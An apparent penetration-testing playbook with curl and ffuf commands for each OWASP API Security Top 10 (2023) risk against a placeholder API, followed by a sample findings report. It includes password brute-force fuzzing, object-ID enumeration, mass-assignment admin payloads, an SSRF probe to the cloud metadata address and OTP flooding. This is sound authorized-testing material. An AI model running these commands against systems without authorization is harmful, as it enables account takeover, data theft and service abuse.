---
name: testing-api-security-with-owasp-top-10
description: Systematic test procedures for all ten OWASP API Security Top 10 (2023) risks against REST and GraphQL APIs using Burp Suite, ffuf, and curl.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- api-security
- owasp
- rest-api
- graphql
version: 1.0.0
---

# Testing API Security with OWASP Top 10

## When to Use

- Authorized API penetration testing engagements requiring structured OWASP coverage
- Pre-production security validation of REST or GraphQL APIs
- Reviewing API security posture against the OWASP API Security Top 10 (2023)
- Validating API gateway controls and rate limiting effectiveness

## Prerequisites

- Written authorization covering all target endpoints
- Burp Suite Professional for interception and manipulation
- Postman for collection-based multi-role testing
- `ffuf` for endpoint and parameter fuzzing
- `curl` / `httpie` for manual probing
- `jq` for parsing JSON responses
- API documentation (OpenAPI/Swagger or GraphQL schema)

## Workflow

### Step 1: Discover and Map Endpoints

```bash
# Parse OpenAPI spec for all paths
curl -s "https://api.target.example.com/swagger.json" | jq '.paths | keys[]'

# Fuzz for undocumented endpoints
ffuf -u "https://api.target.example.com/api/v1/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,401,403,405 -fc 404 \
  -H "Content-Type: application/json"

# Enumerate API versions
for v in v1 v2 v3 v4 beta internal admin; do
  echo "$v: $(curl -s -o /dev/null -w '%{http_code}' https://api.target.example.com/api/$v/users)"
done

# Probe for GraphQL
for path in graphql graphiql playground query gql; do
  echo "$path: $(curl -s -o /dev/null -w '%{http_code}' -X POST \
    -H 'Content-Type: application/json' \
    -d '{"query":"{__typename}"}' \
    https://api.target.example.com/$path)"
done
```

### Step 2: API1 — Broken Object Level Authorization (BOLA)

```bash
TOKEN_A="Bearer <user_a_token>"

# Legitimate request
curl -s -H "Authorization: $TOKEN_A" \
  "https://api.target.example.com/api/v1/users/101/orders" | jq .

# BOLA test — substitute another user's ID
curl -s -H "Authorization: $TOKEN_A" \
  "https://api.target.example.com/api/v1/users/102/orders" | jq .

# Enumerate object IDs at scale
ffuf -u "https://api.target.example.com/api/v1/orders/FUZZ" \
  -w <(seq 1 1000) -H "Authorization: $TOKEN_A" -mc 200 -rate 50
```

### Step 3: API2 — Broken Authentication

```bash
# Missing authentication check
curl -s "https://api.target.example.com/api/v1/users" | jq .

# Decode JWT payload (no verification)
echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Brute-force login (check for rate limiting)
ffuf -u "https://api.target.example.com/api/v1/auth/login" \
  -X POST -H "Content-Type: application/json" \
  -d '{"email":"admin@target.com","password":"FUZZ"}' \
  -w /usr/share/seclists/Passwords/Common-Credentials/top-1000.txt \
  -mc 200 -rate 10

# Password reset — check if token returned in response body
curl -s -X POST "https://api.target.example.com/api/v1/auth/reset" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'
```

### Step 4: API3 — Broken Object Property Level Authorization

```bash
# Check for excess fields in response
curl -s -H "Authorization: $TOKEN_A" \
  "https://api.target.example.com/api/v1/users/101" | jq .
# Look for: password_hash, ssn, internal_id, is_admin, mfa_secret

# Mass assignment — inject fields not in docs
curl -s -X PUT -H "Authorization: $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"name":"Test","role":"admin","is_admin":true}' \
  "https://api.target.example.com/api/v1/users/101" | jq .

# Field include parameters
curl -s -H "Authorization: $TOKEN_A" \
  "https://api.target.example.com/api/v1/users/101?include=password,ssn" | jq .
```

### Step 5: API4 / API6 — Rate Limiting and Unrestricted Sensitive Flows

```bash
# Confirm rate limiting on auth endpoint
for i in $(seq 1 100); do
  status=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong"}' \
    "https://api.target.example.com/api/v1/auth/login")
  echo "Attempt $i: $status"
  [ "$status" == "429" ] && echo "Rate limited at $i" && break
done

# GraphQL complexity / depth attack
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN_A" \
  -d '{"query":"{ users { friends { friends { friends { name } } } } }"}' \
  "https://api.target.example.com/graphql"

# OTP flooding
for i in $(seq 1 20); do
  curl -s -X POST -H "Content-Type: application/json" \
    -d '{"phone":"+1234567890"}' \
    "https://api.target.example.com/api/v1/auth/send-otp"
done
```

### Step 6: API5 — Broken Function Level Authorization

```bash
ADMIN_ENDPOINTS=("/api/v1/admin/users" "/api/v1/admin/settings" "/api/v1/admin/logs" "/api/v1/internal/config")

for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
  for method in GET POST PUT DELETE; do
    status=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" \
      -H "Authorization: $TOKEN_A" -H "Content-Type: application/json" \
      "https://api.target.example.com$endpoint")
    [[ "$status" != "401" && "$status" != "403" && "$status" != "404" ]] && \
      echo "POTENTIAL BFLA: $method $endpoint -> $status"
  done
done
```

### Step 7: API7–API10 — SSRF, Misconfiguration, Inventory, Unsafe Consumption

```bash
# API7: SSRF via URL parameter
curl -s -X POST -H "Authorization: $TOKEN_A" -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' \
  "https://api.target.example.com/api/v1/fetch-url"

# API8: CORS misconfiguration
curl -s -I -H "Origin: https://evil.example.com" \
  "https://api.target.example.com/api/v1/users" | grep -i "access-control"

# API8: Security headers
curl -s -I "https://api.target.example.com/api/v1/health" | \
  grep -iE "(x-frame|x-content|strict-transport|content-security)"

# API8: Verbose error disclosure
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"invalid":' "https://api.target.example.com/api/v1/users"

# API9: Deprecated API versions still active
for v in v0 v1 v2 v3; do
  echo "$v: $(curl -s -o /dev/null -w '%{http_code}' https://api.target.example.com/api/$v/users)"
done
```

## Key Concepts

| Risk | Description |
|------|-------------|
| **API1: BOLA** | Object-level auth missing — users access each other's data by manipulating IDs |
| **API2: Broken Auth** | Weak token mechanisms allow credential stuffing or token forgery |
| **API3: BOPLA** | Excessive data returned, or writable fields not restricted by role |
| **API4: Resource Consumption** | No rate limiting — enables DoS, brute force, enumeration |
| **API5: BFLA** | Low-privilege users reach admin-only functions |
| **API7: SSRF** | Server fetches attacker-controlled URLs — reaches internal services |
| **API8: Misconfiguration** | Verbose errors, wildcard CORS, missing security headers |
| **API9: Improper Inventory** | Deprecated or undocumented endpoints left exposed |

## Tools

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | Full API interception, scanning, multi-role replay |
| **Postman** | Collection management and automated security assertions |
| **ffuf** | Endpoint and parameter fuzzing at scale |
| **jwt_tool** | JWT attack automation |
| **Kiterunner** | API-aware endpoint discovery using route wordlists |
| **Arjun** | HTTP parameter discovery |

## Output Format

```
## API Security Assessment — Summary

Target: api.target.example.com  |  Type: REST (OpenAPI 3.0)

| Risk | Result | Severity | Finding |
|------|--------|----------|---------|
| API1: BOLA | VULNERABLE | Critical | /orders/{id} — IDOR confirmed |
| API2: Auth | VULNERABLE | High | No brute-force protection on /auth/login |
| API3: BOPLA | VULNERABLE | High | role writable via PUT /users/me |
| API4: Rate Limiting | VULNERABLE | Medium | No pagination cap |
| API5: BFLA | PASS | — | Admin endpoints restricted |
| API6: Sensitive Flows | VULNERABLE | Medium | OTP endpoint not rate-limited |
| API7: SSRF | PASS | — | URL params validated |
| API8: Misconfiguration | VULNERABLE | Medium | Stack traces in error responses |
| API9: Inventory | VULNERABLE | Low | API v1 still reachable, undocumented |
| API10: Unsafe Consumption | NOT TESTED | — | No third-party integrations found |
```
